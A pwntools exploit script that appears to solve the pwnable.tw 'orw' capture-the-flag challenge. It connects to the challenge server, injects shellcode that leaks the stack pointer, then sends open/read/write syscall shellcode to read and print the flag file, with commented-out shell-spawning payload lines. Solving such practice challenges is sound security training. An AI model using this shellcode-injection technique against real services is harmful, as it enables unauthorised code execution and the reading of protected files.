#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.terminal = ['tmux', 'splitw', '-h'] #GDB splits
context.update(arch='i386')
exe = './orw'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.remote:
        return remote('chall.pwnable.tw', 10001)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *main+66
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#io = start()
io = remote('chall.pwnable.tw', 10001)
print(io.recv())
elf = ELF(exe)
#rop = ROP(ELF(exe))
#payload = asm(shellcraft.sh())

leak_esp = shellcraft.i386.linux.syscall('SYS_write', 'STDOUT_FILENO', 'ecx',
                                         '4')
jmp_to_read = shellcraft.i386.mov('eax', 0x8048571)

leak_esp_shellcode = asm(f'''
    add esp, 0x8
    mov ecx, esp
    {leak_esp}
    {jmp_to_read}
    jmp eax
   ''')

io.sendline(leak_esp_shellcode)
esp_offset = u32(io.recv())

print(f'Leaked ESP Val: {hex(esp_offset)}')

push_flag = shellcraft.i386.pushstr('/home/orw/flag').rstrip()
flag_path_addr = esp_offset - 44
open_flag = shellcraft.i386.linux.syscall('SYS_open', flag_path_addr, 'O_RDONLY')
read_flag = shellcraft.i386.linux.syscall('SYS_read', 3, elf.bss(), 100)
write_flag = shellcraft.i386.linux.syscall('SYS_write', 'STDOUT_FILENO',
                                           elf.bss(), 100)


leak_flag = asm(f'''
    {push_flag}
    {open_flag}
    {read_flag}
    {write_flag}
   ''')

io.sendline(leak_flag)

#Open File

#Read File
#read_flag shellcraft.i386.linux.syscall

#shellcode = asm(open_flag)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

